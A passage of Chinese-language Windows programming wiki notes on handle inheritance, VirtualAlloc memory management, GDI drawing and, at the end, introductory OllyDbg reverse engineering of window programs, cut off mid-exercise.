这一点可以拿来判断创建的这个东西否是内核对象：Createxxx函数的参数列表中如果有LPSECURITY_ATTRIBUTES类型的参数，则这个object是内核对象 CreateEvent函数为例CreateFileW函数为例CreateThread函数为例CreateProcess函数为例以CreateEvent函数为例，它的第一个参数是LPSECURITY_ATTRIBUTES类型的参数。 123456HANDLE CreateEventA( [in, optional] LPSECURITY_ATTRIBUTES lpEventAttributes, [in] BOOL bManualReset, [in] BOOL bInitialState, [in, optional] LPCSTR lpName); CreateEventA 1[in, optional] lpEventAttributes A pointer to a SECURITY_ATTRIBUTES structure. If this parameter is NULL, the handle cannot be inherited by child processes. The lpSecurityDescriptor member of the structure specifies a security descriptor for the new event. If lpEventAttributes is NULL, the event gets a default security descriptor. The ACLs in the default security descriptor for an event come from the primary or impersonation token of the creator. 以CreateFileW函数为例，它的第四个参数是LPSECURITY_ATTRIBUTES类型的参数。 123456789HANDLE CreateFileW( [in] LPCWSTR lpFileName, [in] DWORD dwDesiredAccess, [in] DWORD dwShareMode, [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes, [in] DWORD dwCreationDisposition, [in] DWORD dwFlagsAndAttributes, [in, optional] HANDLE hTemplateFile); CreateFileW 1[in, optional] lpSecurityAttributes A pointer to a SECURITY_ATTRIBUTES structure that contains two separate but related data members: an optional security descriptor, and a Boolean value that determines whether the returned handle can be inherited by child processes. This parameter can be NULL. If this parameter is NULL, the handle returned by CreateFile cannot be inherited by any child processes the application may create and the file or device associated with the returned handle gets a default security descriptor. The lpSecurityDescriptor member of the structure specifies a SECURITY_DESCRIPTOR for a file or device. If this member is NULL, the file or device associated with the returned handle is assigned a default security descriptor. CreateFile ignores the lpSecurityDescriptor member when opening an existing file or device, but continues to use the bInheritHandle member. The bInheritHandle member of the structure specifies whether the returned handle can be inherited. For more information, see the Remarks section. 以CreateThread函数为例，它的第一个参数是LPSECURITY_ATTRIBUTES类型的参数。 12345678HANDLE CreateThread( [in, optional] LPSECURITY_ATTRIBUTES lpThreadAttributes, [in] SIZE_T dwStackSize, [in] LPTHREAD_START_ROUTINE lpStartAddress, [in, optional] __drv_aliasesMem LPVOID lpParameter, [in] DWORD dwCreationFlags, [out, optional] LPDWORD lpThreadId); 1[in, optional] lpThreadAttributes A pointer to a SECURITY_ATTRIBUTES structure that determines whether the returned handle can be inherited by child processes. If lpThreadAttributes is NULL, the handle cannot be inherited. The lpSecurityDescriptor member of the structure specifies a security descriptor for the new thread. If lpThreadAttributes is NULL, the thread gets a default security descriptor. The ACLs in the default security descriptor for a thread come from the primary token of the creator. 一个进程至少有一个活动线程，所以使用CreateProcess创建一个进程后，就有了一个进程内核对象和一个线程内核对象。 以CreateProcess函数为例： 第3个参数是LPSECURITY_ATTRIBUTES类型的参数，表示CreteProcess后的进程内核对象的句柄是否&quot;允许/可以&quot;被继承 第4个参数是LPSECURITY_ATTRIBUTES类型的参数，表示CreteProcess后进程中的线程内核对象的句柄是否&quot;允许/可以&quot;被继承 123456789101112BOOL CreateProcess( LPCWSTR lpApplicationName, // LPWSTR lpCommandLine, // LPSECURITY_ATTRIBUTES lpProcessAttributes, // 进程句柄是否允许/可以被继承 LPSECURITY_ATTRIBUTES lpThreadAttributes, // 线程句柄是否允许/可以被继承 BOOL bInheritHandles, // DWORD dwCreationFlags, // LPVOID lpEnvironment, // LPCWSTR lpCurrentDirectory, // LPSTARTUPINFOW lpStartupInfo, // LPPROCESS_INFORMATION lpProcessInformation // ); CreateProcessW function 1[in, optional] lpProcessAttributes A pointer to a SECURITY_ATTRIBUTES structure that determines whether the returned handle to the new process object can be inherited by child processes. If lpProcessAttributes is NULL, the handle cannot be inherited. 1[in, optional] lpThreadAttributes A pointer to a SECURITY_ATTRIBUTES structure that determines whether the returned handle to the new thread object can be inherited by child processes. If lpThreadAttributes is NULL, the handle cannot be inherited. LPSECURITY_ATTRIBUTES是一个指向SECURITY_ATTRIBUTES结构体的指针。 12345typedef struct _SECURITY_ATTRIBUTES &#123; DWORD nLength; // 该结构体大小 LPVOID lpSecurityDescriptor; // 指向SecurityDescriptor结构体的指针 BOOL bInheritHandle; // 句柄能否被继承&#125; SECURITY_ATTRIBUTES, *PSECURITY_ATTRIBUTES, *LPSECURITY_ATTRIBUTES; nLength：记录当前结构体的大小。很常见，windows的很多结构体都有这么一个字段 lpSecurityDescriptor：指向安全描述符（SecurityDescriptor结构体）的指针。 A security descriptor includes information that specifies the following components of an object’s security: An owner security identifier (SID) A primary group SID A discretionary access control list (DACL) A system access control list (SACL) Qualifiers for the preceding items 一般情况下不关注这个字段，置NULL，那么采用的安全设置就和父进程一样。（If the value of this member is NULL, the object is assigned the default security descriptor associated with the access token of the calling process.） SECURITY_DESCRIPTOR The SECURITY_DESCRIPTOR structure contains the security information associated with an object. Applications use this structure to set and query an object’s security status. Because the internal format of a security descriptor can vary, we recommend that applications not modify the SECURITY_DESCRIPTOR structure directly. For creating and manipulating a security descriptor, use the functions listed in See Also. bInheritHandle：句柄能否被继承 A Boolean value that specifies whether the returned handle is inherited when a new process is created. If this member is TRUE, the new process inherits the handle. 设置SECURITY_ATTRIBUTES.bInheritHandle字段为TRUE，设置该对象可以被继承，然后传参，那么Createxxx创建的这个内核对象就可以被继承。 另外，这里要再提一下句柄表，句柄表其实还有一列，用来表示这个句柄是否可以被继承。比如 父进程使用CreateEvent创建了内核对象C，设置句柄不可继承。那么在句柄表中，C对象句柄那一行，标识该句柄是否可以被继承的字段就为0，表示不可以继承。 父进程使用CreatFile创建了内核对象D，设置句柄可以被继承。那么在句柄表中，D对象句柄那一行，标识该句柄是否可以被继承的字段就为1，表示可以被继承。 例 创建不可继承和可继承的内核对象 直接传NULL 设置SECURITY_ATTRIBUTES.bInheritHandle字段为TRUE，设置该对象可以被继承，然后传参 CreateEventCreateFileCreateThreadCreateProcess不可继承可继承1234567// 创建一个不可继承的事件对象 HANDLE hEvent = CreateEvent( NULL, // lpEventAttributes 设置为 NULL，表示事件对象不可被继承 FALSE, FALSE, NULL );123456789101112131415// 创建一个可继承的安全属性结构 SECURITY_ATTRIBUTES sa; ZeroMemory (&amp;sa,sizeof(SECURITY_ATTRIBUTES)); sa.nLength = sizeof(SECURITY_ATTRIBUTES); sa.lpSecurityDescriptor = NULL; // 默认使用父类的 sa.bInheritHandle = TRUE; // 设置 bInheritHandle 为 TRUE，表示事件对象可以被继承 // 创建一个可继承的事件对象 HANDLE hEvent = CreateEvent( &amp;sa, // 使用上面设置的可继承的安全属性 FALSE, FALSE, NULL );不可继承可继承12345678910// 打开一个现有文件，不允许继承 HANDLE hFile = CreateFile( TEXT(&quot;example.txt&quot;), GENERIC_READ, 0, NULL, // 安全属性设置为NULL，文件句柄不可继承 OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );123456789101112131415161718// 创建一个可继承的安全属性结构 SECURITY_ATTRIBUTES sa; ZeroMemory (&amp;sa,sizeof(SECURITY_ATTRIBUTES)); sa.nLength = sizeof(SECURITY_ATTRIBUTES); sa.lpSecurityDescriptor = NULL; // 默认使用父类的 sa.bInheritHandle = TRUE; // 设置bInheritHandle为TRUE，文件句柄可继承 // 打开一个现有文件，允许继承 HANDLE hFile = CreateFile( TEXT(&quot;example.txt&quot;), GENERIC_READ, 0, &amp;sa, // 使用可继承的安全属性 OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );不可继承可继承123456789101112131415161718192021DWORD WINAPI ThreadFunc(LPVOID lpParam) &#123; // 线程执行代码 return 0;&#125;int main&#123; HANDLE hThread; DWORD ThreadId; // 创建一个不可继承的线程 hThread = CreateThread( NULL, // lpThreadAttributes 设置为 NULL，线程句柄不可继承 0, ThreadFunc, // 线程函数 NULL, 0, &amp;ThreadId // 返回线程的ID ); //其他细节略&#125;12345678910111213141516171819202122232425262728293031#include &lt;Windows.h&gt;DWORD WINAPI ThreadFunc(LPVOID lpParam) &#123; // 线程执行代码 return 0;&#125;int main&#123; HANDLE hThread; DWORD ThreadId; // 创建一个可继承的安全属性结构 SECURITY_ATTRIBUTES sa; ZeroMemory (&amp;sa,sizeof(SECURITY_ATTRIBUTES)); sa.nLength = sizeof(SECURITY_ATTRIBUTES); sa.lpSecurityDescriptor = NULL; // 默认使用父类的 sa.bInheritHandle = TRUE; // 设置 bInheritHandle 为 TRUE，线程句柄可继承 // 创建一个可继承的线程 hThread = CreateThread( &amp;sa, // 使用可继承的安全属性 0, ThreadFunc, // 线程函数 NULL, 0, &amp;ThreadId // 返回线程的ID ); //其他细节略&#125;不可继承可继承都填NULL的话，表示这个进程的进程句柄和线程句柄不可继承 12345678910111213141516171819STARTUPINFO si;PROCESS_INFORMATION pi;ZeroMemory(&amp;si, sizeof(si));si.cb = sizeof(si);ZeroMemory(&amp;pi, sizeof(pi));// 创建一个不可继承的进程CreateProcess( TEXT(&quot;C:\\\\Windows\\\\System32\\ otepad.exe&quot;), NULL, NULL, // lpProcessAttributes设置为NULL，进程句柄不可继承 NULL, // lpThreadAttributes设置为NULL，线程句柄不可继承 FALSE, // 0, // NULL, // NULL, // &amp;si, // &amp;pi // );1234567891011121314151617181920212223242526STARTUPINFO si;PROCESS_INFORMATION pi;ZeroMemory(&amp;si, sizeof(si));si.cb = sizeof(si);ZeroMemory(&amp;pi, sizeof(pi));// 创建一个可继承的安全属性结构SECURITY_ATTRIBUTES sa;ZeroMemory (&amp;sa,sizeof(SECURITY_ATTRIBUTES));sa.nLength = sizeof(SECURITY_ATTRIBUTES);sa.lpSecurityDescriptor = NULL; // 默认使用父类的sa.bInheritHandle = TRUE; // 设置bInheritHandle为TRUE，使句柄可继承// 创建一个进程句柄和线程句柄可继承的进程CreateProcess( TEXT(&quot;C:\\\\Windows\\\\System32\\ otepad.exe&quot;), NULL, &amp;sa, // 设置 bInheritHandle 为 TRUE，进程句柄可继承 &amp;sa, // 设置 bInheritHandle 为 TRUE，线程句柄可继承 FALSE, // 0, // NULL, // NULL, // &amp;si, // &amp;pi // ); 父进程句柄是否被子进程继承 上面一小节说的是父进程中创建内核对象时表示这个句柄是否可以被继承。现在这一小节说的是子进程是否继承父进程的句柄表。 CreateProcess的第五个参数bInheritHandles就是用来表示创建的这个子进程是否继承父进程的句柄表的内容。 如果继承，子进程将会得到父进程句柄表的内容（但不是完全得到，后面会说） 如果不继承，父进程的句柄表和子进程就没关系呗 123456789101112BOOL CreateProcess( LPCWSTR lpApplicationName, // LPWSTR lpCommandLine, // LPSECURITY_ATTRIBUTES lpProcessAttributes, // LPSECURITY_ATTRIBUTES lpThreadAttributes, // BOOL bInheritHandles, // 是否继承句柄 DWORD dwCreationFlags, // LPVOID lpEnvironment, // LPCWSTR lpCurrentDirectory, // LPSTARTUPINFOW lpStartupInfo, // LPPROCESS_INFORMATION lpProcessInformation // ); CreateProcessW function 1[in] bInheritHandles If this parameter is TRUE, each inheritable handle in the calling process is inherited by the new process. If the parameter is FALSE, the handles are not inherited. Note that inherited handles have the same value and access rights as the original handles. For additional discussion of inheritable handles, see Remarks. Terminal Services: You cannot inherit handles across sessions. Additionally, if this parameter is TRUE, you must create the process in the same session as the caller. Protected Process Light (PPL) processes: The generic handle inheritance is blocked when a PPL process creates a non-PPL process since PROCESS_DUP_HANDLE is not allowed from a non-PPL process to a PPL process. See Process Security and Access Rights 但请注意，如果创建子进程时选择继承，子进程只会继承父进程中可继承的句柄（inheritable handle）。比如父进程句柄表如下： 标识该句柄是否可以被继承（0表示不可以，1表示可以） 索引号 表示的内核对象 0 1 A 1 2 B 0 3 C 1 4 D 子进程继承后的句柄表如下（可继承的就继承过来，不可继承的那行全部填0）： 标识该句柄是否可以被继承（0表示不可以，1表示可以） 索引号 表示的内核对象 0 0 0 1 2 B 0 0 0 1 4 0 如此一来，子进程便可通过继承来的这些句柄值与父进程共享内核对象了。 串讲 文章前面是根据学习顺序写的，有推导过程，这个标题将前面的内容做一个串讲 windows采用句柄表的方式让应用层使用内核对象（进程，线程，文件，Event，互斥体等）。每个进程都有自己私有的一个句柄表，句柄表在进程的EPROCESS结构体中，有三列： 标识该句柄是否可以被继承 索引号 内核对象地址 应用层通过Handle（句柄表中的索引号）来使用内核对象。 每个内核对象都有一个引用计数器，它表示有多少句柄指向该内核对象。如果有进程打开（或复制）一个指向这个内核对象的句柄时，引用计数器就加1；进程使用CloseHandle关闭指向该内核对象的句柄，引用计数器便减1。当引用计数器减至0时，即没有任何进程持有指向该内核对象的句柄时，内核对象才会被销毁。 线程内核对象和进程内核对象除外，即使线程的内核对象计数器为0，线程仍会继续执行；而线程没死，进程也不会死。 线程内核对象释放需要满足两个条件： 关闭线程 线程内核对象引用计数器为0 进程内核对象也一样：关闭进程，进程内核对象引用计数器为0。 如果一个进程里一个活动线程都没有了，进程也就结束了。 判断哪些是内核对象的两种方法： 在MSDNCloseHandle函数页面有指出哪些是内核对象 Createxxx函数的参数列表中如果有LPSECURITY_ATTRIBUTES类型的参数，则这个object是内核对象。 LPSECURITY_ATTRIBUTES是一个指向SECURITY_ATTRIBUTES结构体的指针，SECURITY_ATTRIBUTES结构体中有个成员叫bInheritHandle。 当bInheritHandle为TRUE时，表示句柄可以被继承 当bInheritHandle为FALSE时，表示句柄不可以被继承 因为0环空间是所有进程共享的，所以内核对象是可以在不同进程之间共享的。 共享内核对象的两种方式： 跨进程共享。进程A创建内核对象，进程B打开该内核对象 子进程继承父进程句柄，达到子父进程共享同一内核对象的效果。 CreateProcess第五个参数bInheritHandles用来表示创建的这个子进程是否继承父进程的句柄表的内容。 如果继承，只会继承父进程可继承的句柄（inheritable handle），父进程中不可继承的句柄那行全部填0 辨析 CreateProcess第三个和第四个参数是表示进程句柄，线程句柄是否允许/可以被继承（“创建内核对象时，设置该句柄是否&quot;可以/允许&quot;被继承”这一标题的内容）whether the handle can be inherited(句柄能否被继承) 第五个参数bInheritHandles是表示创建的这个进程是否继承父进程的句柄表（“父进程句柄是否被子进程继承”这一标题的内容）inherite the inheritable handle or not(是否继承句柄) 两个的性质不一样 123456789101112BOOL CreateProcess( LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, // 创建的这个进程的进程句柄能否被继承 LPSECURITY_ATTRIBUTES lpThreadAttributes, // 创建的这个进程的线程句柄能否被继承 BOOL bInheritHandles, // 是否继承父进程句柄表的内容 DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);"},{"title":"私有内存的申请和释放","path":"/wiki/Windows_API/私有内存的申请和释放.html","content":"前言 明白了虚拟内存和物理内存之间的关系后，现在来学习内存管理相关的api。 物理内存分为两种： 私有内存（Private）：该物理页为进程私有，进程独享该物理页 共享内存（Mapped）：该物理页可以被多个进程共享使用 私有内存通过VirtualAlloc/VirtualAllocEx函数申请，这两个函数在底层实现一样。只不过VirtualAllocEx可以为其他进程申请内存。 共享内存通过CreateFileMapping函数映射 私有内存的申请和释放 申请 VirtualAlloc 123456LPVOID VirtualAlloc( [in, optional] LPVOID lpAddress, // 要分配的内存区域的地址 [in] SIZE_T dwSize, // 分配的大小 [in] DWORD flAllocationType, // 分配的类型 [in] DWORD flProtect // 该内存的初始保护属性); lpAddress：要申请的内存地址。 如果申请已被占用的地址，会申请失败 NULL：让系统自行决定在什么地方分配 dwSize：申请多大的内存 MSDN上虽说这个参数单位是字节，但建议以页为单位进行申请，4KB，十六进制是0x1000，十进制4096 flAllocationType：分配的类型 MEM_COMMIT（提交）：不但占用线性地址，并且挂上物理页。不仅保留线性地址空间，还会将其映射到物理内存上。 MEM_RESERVE（保留）：占用线性地址，但没挂物理页。仅保留了线性地址空间，但并不实际分配物理内存。 flProtect:申请的物理页的属性，具体查Memory Protection Constants PAGE_EXECUTE：该物理页可执行 PAGE_EXECUTE_READ：可读可执行 PAGE_READONLY：只读 例 空程序VirtualAlloc申请私有内存空程序，查看其线性地址分配情况 123456#include &lt;Windows.h&gt;int main()&#123; return 0;&#125; 用VirtualAlloc申请一块内存，然后再次查看该进程线性地址分配情况 123456789101112#include &lt;Windows.h&gt;int main()&#123; LPVOID p = VirtualAlloc( NULL, // lpAddress: NULL 表示系统选择分配的地址 0x1000 * 2, // dwSize: 要分配的内存大小，这里是 0x1000（即4KB）的两倍 MEM_COMMIT, // flAllocationType: 内存分配类型，MEM_COMMIT 不但占用线性地址，并且挂上物理页 PAGE_READWRITE); // flProtect: 内存页保护选项，PAGE_READWRITE 表示分配的页可读写 return 0;&#125; 对比空程序的VAD结构，0x3a0-0x3a1是程序用VirtualAlloc申请的2块4KB私有内存。并且commit一列是2，因为VirtualAlloc的第三个参数写了是MEM_COMMIT，如果参数填MEM_RESERVE，commit这一列为0。 释放 VirtualFree 12345BOOL VirtualFree( [in] LPVOID lpAddress, // address of region 内存区域的地址 [in] SIZE_T dwSize, // size of region 内存大小 [in] DWORD dwFreeType // operation type); lpAddress：申请的内存从哪里开始 dwSize：释放的内存有多大 dwFreeType：释放的类型，有两个类型 MEM_DECOMMIT：释放物理页，但线性地址保留 MEM_RELEAS：释放物理内存，释放线性地址，使用这个参数，第二个参数dwSize就必须设置为0 12345678910111213141516#include &lt;Windows.h&gt;int main()&#123; LPVOID p = VirtualAlloc( NULL, // lpAddress: NULL 表示系统选择分配的地址 0x1000 * 2, // dwSize: 要分配的内存大小，这里是 0x1000（即4KB）的两倍 MEM_COMMIT, // flAllocationType: 内存分配类型，MEM_COMMIT 不但占用线性地址，并且挂上物理页 PAGE_READWRITE); // flProtect: 内存页保护选项，PAGE_READWRITE 表示分配的页可读写 VirtualFree( p, // lpAddress: 指向要释放的内存区域的指针 0, // dwSize: 释放的内存大小，当flFreeType为MEM_RELEASE时，此参数必须为0 MEM_RELEASE); // dwFreeType: 释放操作的类型，MEM_RELEASE 完全释放指定地址的内存块（虚拟内存和物理内存） return 0;&#125; 堆和栈 申请内存只有两种方式： 通过VirtualAlloc/VirtualAllocEx申请私有内存（Private Memory） 通过CreateFileMapping映射的: Mapped Memory 堆和栈是内存管理形式，堆是用于想要动态申请内存大小的情况，栈是给局部变量使用的。它们并不是申请内存。 堆和栈的本质就是私有内存。 12345678910int main(int argc, char* argv[])&#123; int x = 0x12345678; // 栈 int* y = (int*)malloc(sizeof(int) * 128); // 堆 printf(&quot;栈：%x &quot;, &amp;x); printf(&quot;堆：%x &quot;, y); return 0;&#125; 运行输出123栈：12ff7c堆：3807b8 操作系统加载PE时按PE中的信息，用VirtualAlloc申请好了线性地址空间。程序中的malloc不过是从这些已申请好的空间拿一部分出来用。证明方式：哪怕程序中没有malloc申请堆内存，从最上面空程序的线性地址分配情况看，0x380-0x38f这块内存都会被申请。 栈空间也是用的操作系统用VirtualAlloc提前申请好的0x30-0x12f这块私有内存空间。"},{"title":"窗口的本质","path":"/wiki/Windows_API/窗口的本质.html","content":"窗口的本质 老样子，先从整体结构上说下窗口的本质，便于后续的学习。 前面提过，每个进程都有自己的4GB虚拟内存空间，低2G为进程自己拥有，称做用户空间，高2G是内核空间，为所有进程共同拥有。用户空间是由很多个模块组成，在内核空间中，同样也是由各种各样的模块组成。 在内核空间中，有一个模块叫ntoskrnl.exe，windows api编程中与进程、线程、内存管理等相关功能的实现在这个模块中；还有一个模块叫win32k.sys，在这个模块中实现了图形界面、消息管理。开发者在应用层调用CreateProcess，看似是调用来自于kernel32.dll的api，实际上kernel32.dll是ntoskrnl.exe提供的接口，真正的实现在ntoskrnl.exe中。同样的，user32.dll和gdi32.dll是win32k.sys提供的接口，真正的实现在win32k.sys中。 如果想使用windows系统提供的已经画好的窗口，那用的是user32.dll，也称GUI编程；如果不使用windows系统已画好的窗口，而是想自己画窗口，比如画一朵花，那使用的是gdi32.dll，也称GDI编程。 之前在进程篇的api里提到过HANDLE句柄是进程私有句柄表中的一个索引号，进程B拿着进程A的HANDLE（索引号）去操作是没有意义的。在图形界面编程中，也有句柄的概念，它叫HWND，与进程的私有句柄不同，它是全局的。 win32k.sys中有一堆已经实现好画好的窗口，比如下图中的A窗口，B窗口。有一张全局的句柄表，记录了这些窗口句柄和窗口的映射关系。在应用层，进程X通过HWND：1来使用A窗口（安全，用句柄做一层隔离）。这个HWND：1在进程Y中是有意义的，因为窗口的句柄表是全局的，不像进程那样是私有的。 GDI编程初探 不必耗费太多心思在GDI上，这里是为了通过GDI编程来初步体会窗口的本质，消息机制的本质。 GDI（Graphics Device Interface），图形设备接口。 使用GDI来画窗口的大致步骤是： 设备对象（画在哪） 获取设备的上下文对象（DC） 图像对象并设置相关属性（不设置就是使用默认的） 图像对象 作用 画笔(Pen) 影响线条，包括颜色、粗细、虚实、箭头形状等 画刷(Brushes) 影响对形状、区域等操作，如使用的颜色、是否有阴影等 字体(Fonts) 影响文字输出的字体 位图(Bitmaps) 影响位图创建、位图操作和保存等 将上下文对象（DC）与图像对象进行关联 开始画 释放资源 例1 确定设备对象（画在哪） 通俗点讲，就是在哪个窗口上画。可以使用spy++获取目标窗口的handle值，假设要在dbgview64上的这个窗口上画，获取到的handle值是0x145126A。如果是NULL，默认是桌面。 1HWND hwnd = (HWND)0x145126A; // 窗口句柄 获取设备的上下文对象（DC） 我们并不是直接就在这个窗口上画，而是在内存中画。在内存中画完后，操作系统会将内存中的内容贴到目标窗口上。获取设备的上下文对象的意思就是找这么一块内存，将这块内存和设备对象关联起来。 1HDC hdc = GetDC(hwnd); 创建图像对象并设置相关属性 有画笔，画刷，字体，位图这些图像对象，这取决于你想画啥。如果想画线条就用画笔，想画矩形就用画刷，这里以画笔为例，创建一个画笔。 12345HPEN hpen = CreatePen( PS_SOLID, // pen style 实线 5, // pen width 线条宽度 RGB(0xFF, 00, 00) // pen color 线条颜色，由RGB三位组成，这里的例子是纯红色); 每个dc都有一个默认的画笔，画刷，字体，位图这些图像对象，如果没有第3步（创建图像对象并设置相关属性），也能直接到第5步开始画，那么使用的就是默认的图像对象。 将上下文对象（DC）与图像对象进行关联 要不就是创建了一个画笔Pen，和DC啥关系没有，要关联起来。 1SelectObject(hdc, hpen); 开始画 比如画直线。电脑的屏幕左上角是坐标(0,0)，右下角是最大的x和y，(x,y)。LineTo是从当前位置画到(第二个参数,第三个参数)(x,y) 可以用MoveToEx函数修改当前位置的点位。 123LineTo(hdc, // device context handle 400, // x-coordinate of ending point 400); // y-coordinate of ending point 释放资源 获取句柄和释放句柄是成对的 Create对应Delete，创建&lt;-&gt;删除，比如CreatePen&lt;-&gt;DeletePen; Get对应Release，得到&lt;-&gt;释放，比如GetDC&lt;-&gt;ReleaseDC。 123// 6. 释放资源DeleteObject(hpen);ReleaseDC(hwnd,hdc); 完整代码123456789101112131415161718192021222324252627282930313233#include &lt;windows.h&gt;int main()&#123; // 1. 设备对象（画在哪） HWND hwnd = (HWND)0x145126A; // 窗口句柄 // 2. 获取设备的上下文对象（DC） HDC hdc = GetDC(hwnd); // 3. 创建图像对象并设置相关属性 HPEN hpen = CreatePen( PS_SOLID, // pen style 实线 5, // pen width 线条宽度 RGB(0xFF, 00, 00) // pen color 线条颜色，由RGB三位组成，这里的例子是纯红色 ); // 4. 将上下文对象（DC）与图像对象进行关联 SelectObject(hdc, // handle to DC hpen // handle to object ); // 5. 开始画 LineTo(hdc, // device context handle 400, // x-coordinate of ending point 400); // y-coordinate of ending point // 6. 释放资源 DeleteObject(hpen); ReleaseDC(hwnd, hdc); return 0;&#125; 例2 操作系统也提供了一些现成的图像对象供开发者使用，使用GetStockObject获得这个现成的设置好的图像对象。 12345678910111213141516171819202122232425262728#include &lt;windows.h&gt;int main()&#123; // 1. 设备对象（画在哪） HWND hwnd = (HWND)0x145126A; // 窗口句柄 // 2. 获取设备的上下文对象（DC） HDC hdc = GetDC(hwnd); // 3. 创建图像对象并设置相关属性 HBRUSH hBrush = (HBRUSH)GetStockObject(DC_BRUSH); // 使用现成的画刷图像对象 SetDCBrushColor(hdc, RGB(0xFF, 0xFF, 00)); // 设置画刷颜色 // 4. 将上下文对象（DC）与图像对象进行关联 SelectObject(hdc, // handle to DC hBrush // handle to object ); // 5. 开始画 Rectangle(hdc, 0, 0, 400, 400); // 矩形范围是(0,0)到(400,400) // 6. 释放资源 DeleteObject(hBrush); ReleaseDC(hwnd, hdc); return 0;&#125; 不断重绘的窗口 无论多么复杂的窗口，都是画出来的。在使用windows系统时会知道，当我们用A窗口挡住B窗口，比如用cmd挡住notepad窗口的部分内容，然后将cmd窗口移开后，notepad原本被遮挡的部分又能显示出来。这是因为挡住移开后，windows又重新画了一遍。所以，窗口是不断绘制的。 在上面两个例子中，比如例2，画了一个矩形，当用另一个窗口挡住这个黄色矩形后，然后移开挡住物，就再也看不见被挡住的黄色矩形了，这是因为我们的程序只画了一次。挡住，移动，就没了。而在windows操作系统中，窗口都是在不断地绘制，每次的挡住移开，被挡住的部分又重新画了一次。"},{"title":"窗口程序逆向分析","path":"/wiki/Windows_API/窗口程序逆向分析.html","content":"win32应用程序入口识别 逆向分析的人本身一定是会造飞机的人，只不过他造的可能没有别人好，没有别人快，但他一定知道造一架完整的飞机需要什么 先写程序，把自己的代码看懂了，再逆别人的 程序启动后执行入口函数，然后才到程序的语法入口函数WinMain。WinMain有四个参数，函数调用约定是__stdcall（参数从右到左压栈，内平栈）。hInstance是最后压入栈的。 123456int APIENTRY WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd); 例 程序载入OD后往下找四个参数的call，看到GetModuleHandle（获取当前模块的句柄），返回结果在eax，然后就是call 004010000，有点像是WinMain(因为参数从右到左压栈，hInstance最后压栈)。call 004010000前有挺多个push的，5个。 OD为什么知道这里是GetModuleHandle？ 40602C是IAT表表项的地址，exe加载后，系统加载器会将[40602C]替换为函数地址。OD下面写出的函数名，估计是INT表和IAT表一对，就知道哪个函数名，对应哪个函数地址 进004010000看下内平栈的数量，16字节，4个参数，但还不能确定，因为可能有寄存器传参。 往前看，ecx，edx寄存器的值是call里面赋值的，而不是外面calling者传进来的，所以没有寄存器传参。 综合以上：这个call参数是4个，最后一个参数是模块句柄，就是我们要找的WinMain函数。 ESP寻址 本文中的exe是Release版，Release版call一个函数进入后，并没有像之前讲的push ebp，mov ebp,esp，抬栈，填充0xCC那样的套路，随后用EBP寻址。而是直接抬栈，然后用ESP寻址，因为省事，不需要繁琐的步骤（push ebp，mov ebp,esp，抬栈，填充0xCC）。 EBP寻址，EBP的值在整个栈帧周期是不会变的，而ESP寻址，只要堆栈有变化，ESP寻址加的偏移就变了。 假设在A函数中调用B函数，EIP指到B函数sub esp,44但还未执行时，堆栈中的内容是什么？ 这样分析：依次压了三个参数，然后是call指令，call指令条状前会压入call指令的下一条指令。那么堆栈中依次是：返回地址，参数3，参数2，参数1。 A函数中调用B函数1234push 参数1push 参数2push 参数3call B B函数开头123sub esp,44...... 堆栈中写的返回到....，就是返回地址（可以对这个地址右键在反汇编窗口中跟过去） 此时，如果我们想用ESP寻址来表示hInstance这个参数，就是[ESP+4]。 如果执行了抬栈操作sub esp,44，此时想用ESP寻址来表示hInstance这个参数，就是[ESP+44+4]，即[ESP+48]。如果又执行了一句push esi，此时想用ESP寻址来表示hInstance这个参数，就是[ESP+44+4+4],即[ESP+4C]。 如果想知道mov esi,dword ptr ss:[esp+4c]这条指令中的[esp+4c]是指哪里，必须要用执行到这句时esp来算esp+4c。 在堆栈窗口可以双击某个堆栈地址，以当前堆栈地址作为相对值，OD会自动计算出其他堆栈地址相当于当前地址的相对值。 小结： ESP寻址方式，注意堆栈的变化会引起ESP寻址时偏移的变化。 可以借助堆栈窗口相对ESP的功能来帮助自己进行逆向分析。 窗口回调函数的定位 wndClass.lpfnWndProc指明了回调函数的地址。之前写过第一个窗口程序，我们就可以知道，创建完wndClass对象后给成员赋值后，要用RegisterClass注册窗口类。RegisterClass的参数是一个wndClass对象的指针。于是我们找到RegisterClass函数，看它的参数的值（wndClass对象的地址） 在寄存器窗口右键EDX的值选择“堆栈窗口中跟随”，看堆栈窗口。此时这10个成员的值都是0。往后看汇编指令，明白了，Release下它先压参数，然后再给堆栈中这些成员赋值。 tips：目前我们关注堆栈中这10个参数的变化，如果不想让后续指令的执行影响到堆栈窗口的变化，可以在堆栈窗口右键“锁定堆栈（lock stack）” 堆栈中从上到下的顺序就是wndClass结构体参数的顺序，第二个参数就是回调函数地址。在堆栈窗口右键，在反汇编窗口跟随，就能跳过去了。 123456789101112typedef struct tagWNDCLASSA &#123; UINT style; WNDPROC lpfnWndProc; int cbClsExtra; int cbWndExtra; HINSTANCE hInstance; HICON hIcon; HCURSOR hCursor; HBRUSH hbrBackground; LPCSTR lpszMenuName; LPCSTR lpszClassName;&#125; WNDCLASSA, *PWNDCLASSA, *NPWNDCLASSA, *LPWNDCLASSA; 具体消息处理的定位 找到回调函数在回调函数开头下断后，不能放过去跑。因为消息在不断产生，在函数开头断下，会一直被断下，然后只能放过去，然后又断下，啥也做不了。 点击Break窗口，对该断点右键“编辑条件”添加条件，只对自己感兴趣的消息加断点，比如当鼠标左键点下时的消息[esp+8]==WM_LBUTTONDOWN（不写宏，写数值的话要写十六进制） 刚进入到回调函数开头，[esp]是返回地址，[esp+4]是第一个参数hwnd，[esp+8]是第二个参数uMsg （下图是添加条件断点后截图的，为了说明堆栈里的值分别是什么） 如此，让程序跑起来，只有触发鼠标左键消息WM_LBUTTONDOWN时OD才会断下。断下后就是继续分析做了什么事，调用了什么call之类的 （下图是程序跑起来后，在窗口上点击鼠标左键，触发断点，OD断下的截图） 练习 找出按下键盘哪3个键不会弹出Error Code的窗（ReverseTraining_1.exe） 过程找到回调函数后下条件断点[esp+8]==WM_KEYDOWN，跑起来，对窗口假设按下a键查虚拟键码的表格Virtual-Key Codes (Winuser.h) - Win32 apps | 